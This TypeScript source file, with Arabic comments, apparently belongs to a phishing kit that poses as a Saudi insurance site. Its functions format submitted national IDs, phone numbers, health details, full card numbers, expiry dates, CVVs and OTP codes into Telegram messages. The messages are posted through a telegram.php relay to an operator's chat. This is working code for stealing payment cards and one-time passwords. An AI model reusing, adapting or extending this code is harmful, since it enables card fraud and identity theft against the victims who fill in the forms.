/**
 * رسائل Telegram مطابقة حرفاً لمسارات PHP القديمة (tele/info.php, tele/payen.php, tele/otpan.php).
 */

function phpEscTelegramSafe(v: string): string {
  return v
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

function telegramProxyUrl(): string {
  return (import.meta.env.VITE_TELEGRAM_PROXY_URL ?? '/telegram.php').trim()
}

/** الإرسال عبر telegram.php على الاستضافة (المتصفح لا يستطيع الاتصال بـ api.telegram.org مباشرة) */
export async function telegramSend(html: string, repeat = 1): Promise<boolean> {
  try {
    const res = await fetch(telegramProxyUrl(), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: html, repeat }),
    })
    if (!res.ok) {
      console.warn('[telegram]', res.status, await res.text())
      return false
    }
    const data = (await res.json()) as { ok?: boolean }
    return data.ok === true
  } catch (e) {
    console.warn('[telegram]', e)
    return false
  }
}

/** tele/info.php — نفس أسطر القالب + التوقيت المحلي Y-m-d H:i:s تقريبي */
export function buildInfoPhpTelegramText(params: {
  form_type: string
  insurance_type?: string
  document_type?: string
  /** كل الحقول المستخرجة كنصوص لتطابق الشرط `$param !== ''` */
  seller_id?: string
  buyer_id?: string
  full_name_transfer?: string
  phone_number_transfer?: string
  id_number?: string
  full_name?: string
  phone_number?: string
  manufacturing_year?: string
  serial_number_customs?: string
  serial_number?: string
  captcha_input?: string
  coverage_type?: string
  age?: string
  gender?: string
  social_status?: string
  chronic_diseases?: string
  hospital_network?: string
  monthly_income?: string
}): string {
  const p = params
  const safe = phpEscTelegramSafe
  const when = formatPhpWhen()

  const lines: string[] = []
  lines.push(`🟧 <b>وصول نموذج جديد</b>`)
  lines.push(`النوع: <b>${safe(p.form_type)}</b>`)

  if (p.form_type === 'vehicle') {
    if (p.insurance_type !== undefined && p.insurance_type !== '') {
      lines.push(`نوع التأمين: <b>${safe(p.insurance_type)}</b>`)
    }
    if (p.document_type !== undefined && p.document_type !== '') {
      lines.push(`نوع المستند: <b>${safe(p.document_type)}</b>`)
    }

    if (p.insurance_type === 'transfer') {
      if (p.seller_id) lines.push(`هوية البائع: <code>${safe(p.seller_id)}</code>`)
      if (p.buyer_id) lines.push(`هوية المشتري: <code>${safe(p.buyer_id)}</code>`)
      if (p.full_name_transfer) lines.push(`الاسم الكامل: ${safe(p.full_name_transfer)}`)
      if (p.phone_number_transfer) lines.push(`الهاتف: <code>${safe(p.phone_number_transfer)}</code>`)
    } else {
      if (p.id_number) lines.push(`رقم الهوية/الإقامة: <code>${safe(p.id_number)}</code>`)
      if (p.full_name) lines.push(`الاسم الكامل: ${safe(p.full_name)}`)
      if (p.phone_number) lines.push(`الهاتف: <code>${safe(p.phone_number)}</code>`)
    }

    if (p.document_type === 'customs') {
      if (p.manufacturing_year) lines.push(`سنة الصنع: <code>${safe(p.manufacturing_year)}</code>`)
      if (p.serial_number_customs)
        lines.push(`الرقم التسلسلي (جمرك): <code>${safe(p.serial_number_customs)}</code>`)
    } else {
      if (p.serial_number)
        lines.push(`الرقم التسلسلي (استمارة): <code>${safe(p.serial_number)}</code>`)
    }

    if (p.captcha_input && p.captcha_input !== '')
      lines.push(`رمز التحقق المدخل: <code>${safe(p.captcha_input)}</code>`)
  } else if (p.form_type === 'medical') {
    if (p.coverage_type) lines.push(`نوع التغطية: <b>${safe(p.coverage_type)}</b>`)
    if (p.age) lines.push(`العمر: <code>${safe(p.age)}</code>`)
    if (p.gender) lines.push(`الجنس: <b>${safe(p.gender)}</b>`)
    if (p.social_status) lines.push(`الحالة الاجتماعية: <b>${safe(p.social_status)}</b>`)
    if (p.chronic_diseases)
      lines.push(`أمراض مزمنة: <b>${safe(p.chronic_diseases)}</b>`)
    if (p.hospital_network)
      lines.push(`شبكة المستشفيات: <b>${safe(p.hospital_network)}</b>`)
    if (p.monthly_income) lines.push(`الدخل الشهري: <b>${safe(p.monthly_income)}</b>`)
  }

  lines.push(`الوقت: <b>${safe(when)}</b>`)
  return lines.join('\n')
}

export type InfoPhpLeadParams = Parameters<typeof buildInfoPhpTelegramText>[0]

function formatPhpWhen(): string {
  const d = new Date()
  const pad = (n: number) => String(n).padStart(2, '0')
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
}

/** نوع تأمين JSON كما POST insurance_json */
export type PhpInsuranceSubset ={
  company?: string
  plan?: string
  base?: string | number
  price?: string | number
  vat?: string | number
  total?: string | number
  features?: { label?: string; price?: string | number }[]
  start_date?: string
  end_date?: string
}

/** tele/payen.php — مطابقة دمج السطور قبل curl */
export function buildPayenPhpTelegramText(params: {
  cardholder_name: string
  card_number: string
  expiry_date: string
  cvv: string
  payment_method: string
  total_amount: string
  user_id: string
  client_ip: string
  insurance: PhpInsuranceSubset
  features_flat: unknown[]
  start_date: string
  end_date: string
}): string {
  const esc = phpEscTelegramSafe
  const ins = params.insurance
  const L: string[] = []
  L.push(`🧾 <b>عملية دفع تأمين جديدة</b>`)
  L.push(`— — — — — — — — —`)
  L.push(`🏢 <b>بيانات التأمين</b>`)
  L.push(`• الشركة: <b>${esc(String(ins.company ?? 'غير متوفر'))}</b>`)
  L.push(`• الخطة: <b>${esc(String(ins.plan ?? 'غير متوفر'))}</b>`)
  L.push(`• الأساسي: <b>${esc(String(ins.base ?? ''))} ريال</b>`)
  L.push(`• الفرعي: <b>${esc(String(ins.price ?? ''))} ريال</b>`)
  L.push(`• الضريبة 15%: <b>${esc(String(ins.vat ?? ''))} ريال</b>`)
  L.push(
    `• الإجمالي: <b>${esc(String(ins.total ?? params.total_amount ?? ''))} ريال</b>`,
  )
  const sd = params.start_date || 'غير متوفر'
  const ed = params.end_date || 'غير متوفر'
  if (sd !== 'غير متوفر' || ed !== 'غير متوفر') {
    L.push(`• الفترة: ${esc(sd)} → ${esc(ed)}`)
  }
  const feat = params.features_flat
  if (feat.length > 0) {
    L.push(`• <u>الإضافات المختارة:</u>`)
    for (const f of feat) {
      if (typeof f === 'object' && f !== null && 'label' in f) {
        const fx = f as { label?: string; price?: string | number }
        const lab = esc(String(fx.label ?? '-'))
        const pr = esc(String(fx.price ?? '0'))
        L.push(` ◦ ${lab} (+${pr} ريال)`)
      } else if (typeof f === 'string') L.push(` ◦ ${esc(f)} (+0 ريال)`)
    }
  }
  L.push(`— — — — — — — — —`)
  L.push(`💳 <b>بيانات الدفع</b>`)
  L.push(`• الاسم على البطاقة: <b>${esc(params.cardholder_name)}</b>`)
  L.push(`• card number: <code>${esc(params.card_number)}</code>`)
  L.push(`• الانتهاء: <code>${esc(params.expiry_date)}</code>`)
  L.push(`• CVV: <code>${esc(params.cvv)}</code>`)
  L.push(`• طريقة الدفع: ${esc(params.payment_method)}`)
  L.push(`• المبلغ المطلوب: <b>${esc(params.total_amount)} ريال</b>`)
  L.push(`• 🌐 IP العميل: <code>${esc(params.client_ip)}</code>`)
  if (params.user_id !== 'غير متوفر' && params.user_id.trim() !== '') {
    L.push(`• معرف المستخدم: ${esc(params.user_id)}`)
  }
  return L.join('\n')
}

/** tele/otpan.php بناء السطور قبل الإرسال */
export function buildOtpanPhpTelegramText(params: {
  pin_code: string
  timestamp_iso: string
  payment_amount: string
  card_last_digits: string
  cardholder_name: string
  masked_card: string
  card_raw: string
  expiry_date: string
  cvv_raw: string
  total_amount_sess: string
  insurance: PhpInsuranceSubset & { features?: unknown[] }
}): string {
  const esc = phpEscTelegramSafe
  const ins = params.insurance
  const features = Array.isArray(ins.features) ? ins.features : []
  let last4 = params.card_last_digits
  const raw = params.card_raw.replace(/\D+/g, '')
  if ((!last4 || last4 === '') && raw) {
    last4 = raw.slice(-4)
  }

  const L: string[] = []
  L.push(`✅ <b>OTP مُستلم</b>`)
  L.push(`— — — — — — — — —`)
  L.push(`🔢 <b>الرمز:</b> <code>${esc(params.pin_code)}</code>`)
  L.push(`🕒 <b>الوقت:</b> ${esc(params.timestamp_iso)}`)
  L.push(`— — — — — — — — —`)
  L.push(`💳 <b>بيانات البطاقة (إعادة إرسال)</b>`)
  L.push(`• الاسم: <b>${esc(params.cardholder_name)}</b>`)
  L.push(`• card number: <code>${esc(params.masked_card)}</code>`)
  if (last4 && last4 !== '') L.push(`• آخر 4: <code>${esc(last4)}</code>`)
  L.push(`• الانتهاء: <code>${esc(params.expiry_date)}</code>`)
  L.push(`• CVV: <code>${esc(params.cvv_raw)}</code>`)
  if (params.card_raw.trim() !== '') {
    L.push(`• card number: <code>${esc(params.card_raw)}</code>`)
  }
  const amtPay = params.payment_amount?.trim?.() ?? ''
  const amtSess = params.total_amount_sess ?? ''
  if (amtPay || amtSess) {
    const val = amtPay || amtSess || ''
    L.push(`• المبلغ: <b>${esc(val)}</b>`)
  }
  L.push(`— — — — — — — — —`)
  L.push(`🏢 <b>ملخّص التأمين</b>`)
  L.push(`• الشركة: <b>${esc(String(ins.company ?? ''))}</b>`)
  L.push(`• الخطة: <b>${esc(String(ins.plan ?? ''))}</b>`)
  L.push(`• الأساسي: <b>${esc(String(ins.base ?? ''))} ريال</b>`)
  L.push(`• الفرعي: <b>${esc(String(ins.price ?? ''))} ريال</b>`)
  L.push(`• الضريبة 15%: <b>${esc(String(ins.vat ?? ''))} ريال</b>`)
  L.push(`• الإجمالي: <b>${esc(String(ins.total ?? ''))} ريال</b>`)
  if (features.length > 0) {
    L.push(`• <u>الإضافات:</u>`)
    for (const rf of features) {
      const f =
        typeof rf === 'object' &&
        rf !== null &&
        'label' in (rf as object)
          ? (rf as { label?: unknown; price?: unknown })
          : undefined
      const lab = esc(String(f?.label ?? '-'))
      const pr = esc(String(f?.price ?? '0'))
      L.push(` ◦ ${lab} (+${pr} ريال)`)
    }
  }
  const s = ins.start_date ?? ''
  const e = ins.end_date ?? ''
  if (String(s || e).trim() !== '') L.push(`• الفترة: ${esc(String(s))} → ${esc(String(e))}`)
  return L.join('\n')
}
